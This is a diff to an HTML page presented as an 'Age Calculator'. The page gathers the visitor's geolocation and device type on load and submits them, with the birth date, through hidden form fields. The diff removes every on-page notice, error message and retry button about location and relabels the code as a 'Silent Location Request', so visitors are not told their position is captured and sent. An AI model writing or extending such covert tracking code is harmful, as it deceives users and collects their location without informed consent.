@@ -57,18 +57,18 @@
       margin-bottom: 8px;
     }
     
-    .container.message-text{
-      font-size:1.2em;
-      color:black;
-      font-weight:bold;
-      font-style:normal;
-      font-family:Arial,sans-serif
-      border:2px solid black;
-      padding:6px 10px
-      border-radius:6px;
-      width:fit-content;
-      box-sizing:border-box;
-      
+    .container .message-text {
+      font-size: 1.2em;
+      color: black;
+      font-weight: bold;
+      font-style: normal;
+      font-family: Arial, sans-serif;
+      border: 2px solid black;
+      padding: 6px 10px;
+      border-radius: 6px;
+      width: fit-content;
+      margin: 0 auto 20px auto; /* Centered */
+      box-sizing: border-box;
     }
 
     input[type="text"],
@@ -104,33 +104,9 @@
     button:hover {
       background-color: #c2185b;
     }
-    
-    /* Style for the new retry button */
-    .retry-button {
-      background-color: #757575;
-      font-size: 1.1em;
-      padding: 8px 20px;
-      margin-top: 10px;
-    }
-    .retry-button:hover {
-       background-color: #616161;
-    }
 
     .hidden {
       display: none !important;
-    }
-    
-    #status {
-        /* Adjusted font size to look better */
-        font-size: 1.2em; 
-        color: #757575;
-        margin-top: 10px;
-        margin-bottom: 10px;
-        visibility: hidden; /* Added margin */
-    }
-    #status.error-status {
-        color: #D32F2F;
-        font-weight: bold;
     }
   </style>
 </head>
@@ -159,12 +135,6 @@
       <input type="hidden" name="_form_origin" value="Page 1 - Age Calculator" />
 
       <button type="button" onclick="handleSubmit()">Calculate 💌</button>
-      
-      <p id="status"></p>
-      <button type="button" id="retryLocationBtn" class="retry-button hidden" onclick="requestLocation()">
-        Retry Location
-      </button>
-
     </form>
   </div>
 
@@ -173,9 +143,7 @@
     <p id="ageLine"></p>
     <p id="birthdayLine"></p>
     <p id="deviceLine"></p>
-    <div class="container">
-      <div class="message-text">Itne din ho gaue paida ho ke kuch nahi kiya. age dekh ke kya kar lega.</div>
-      </div>
+    <div class="message-text">Itne din ho gaye paida ho ke kuch nahi kiya. Age dekh ke kya kar lega.</div>
     <button onclick="goToMainPage()">Go Back to Main Page</button>
   </div>
 
@@ -187,21 +155,12 @@
     let currentLatitude = "";
     let currentLongitude = "";
     
-    // --- NEW: Moved all location logic into its own function ---
+    // --- NEW: Silent Location Request (No UI updates) ---
     function requestLocation() {
-        const statusElement = document.getElementById('status');
-        const retryBtn = document.getElementById('retryLocationBtn');
-
-        // Hide retry button and show loading status
-        retryBtn.classList.add('hidden');
-        statusElement.textContent = 'Requesting location...';
-        statusElement.classList.remove('error-status');
-
         if (navigator.geolocation) {
             const options = {
-                // --- CHANGED: Set to false for a faster, more reliable network-based fix ---
                 enableHighAccuracy: false, 
-                timeout: 10000, // 10 seconds is plenty for a network fix
+                timeout: 10000,
                 maximumAge: 0
             };
 
@@ -214,46 +173,17 @@
                     document.getElementById("latitude").value = currentLatitude;
                     document.getElementById("longitude").value = currentLongitude;
 
-                    statusElement.textContent = 'Location captured successfully.';
-                    statusElement.classList.remove('error-status');
-                    retryBtn.classList.add('hidden'); // Hide button on success
-
-                    console.log('--- Location Captured ---');
-                    console.log(`Latitude: ${currentLatitude}`);
-                    console.log(`Longitude: ${currentLongitude}`);
-                    console.log('-----------------------');
+                    console.log('--- Location Captured Silently ---');
                 },
                 function (error) {
                     // --- ERROR ---
-                    let errorMessage = 'An unknown error occurred.';
-                    switch (error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMessage = 'Location permission was denied. Please allow location in your browser site settings.';
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMessage = 'Location information is unavailable (e.g., no signal).';
-                            break;
-                        case error.TIMEOUT:
-                            errorMessage = 'The request for location timed out.';
-                            break;
-                        case error.UNKNOWN_ERROR:
-                            errorMessage = 'An unknown error occurred.';
-                            break;
-                    }
-                    statusElement.textContent = `Error: ${errorMessage}`;
-                    statusElement.classList.add('error-status');
-                    retryBtn.classList.remove('hidden'); // <-- NEW: Show retry button on failure
-
-                    console.error('Geolocation Error:', error);
-
+                    console.error('Geolocation Error (Silent):', error);
                     document.getElementById("latitude").value = "Unavailable";
                     document.getElementById("longitude").value = "Unavailable";
                 },
                 options
             );
         } else {
-            statusElement.textContent = 'Geolocation is not supported by this browser.';
-            statusElement.classList.add('error-status');
             console.error('Geolocation is not supported by this browser.');
             document.getElementById("latitude").value = "Unsupported";
             document.getElementById("longitude").value = "Unsupported";
@@ -262,10 +192,9 @@
 
 
     window.onload = function () {
-        // --- MODIFIED: Call the new location function ---
+        // Call the location function immediately on load
         requestLocation();
 
-        // This part remains the same
         const ua = navigator.userAgent;
         const isMobile = /Mobi|Android/i.test(ua);
         document.getElementById("deviceType").value = isMobile ? "Mobile" : "Desktop";
@@ -294,8 +223,7 @@
 
       const formData = new FormData(document.getElementById("mainForm"));
 
-      // Set location values *right before* submit, just in case they were captured
-      // after the page load but before the submit.
+      // Set location values right before submit
       formData.set("latitude", currentLatitude || "Unavailable");
       formData.set("longitude", currentLongitude || "Unavailable");
 
@@ -305,7 +233,6 @@
         headers: { Accept: "application/json" }
       })
       .then(response => {
-        // This logic remains the same, as it was fine.
         const result = calculateDetails(dob);
         document.getElementById("ageLine").textContent = "Calculated Age: " + result.ageString;
         document.getElementById("birthdayLine").textContent = "Days remaining to next birthday: " + result.daysLeft;
@@ -316,7 +243,6 @@
       })
       .catch((error) => {
           console.error('Error:', error);
-          // This logic also remains the same.
           const result = calculateDetails(dob);
           document.getElementById("ageLine").textContent = "Calculated Age: " + result.ageString;
           document.getElementById("birthdayLine").textContent = "Days remaining to next birthday: " + result.daysLeft;
@@ -357,10 +283,10 @@
 
     function goToMainPage() {
       document.getElementById("mainForm").reset();
-      // --- NEW: Also re-request location when going back to the main page ---
       requestLocation();
       goToPage(1);
     }
   </script>
 </body>
-</html>
+  </html>
+      
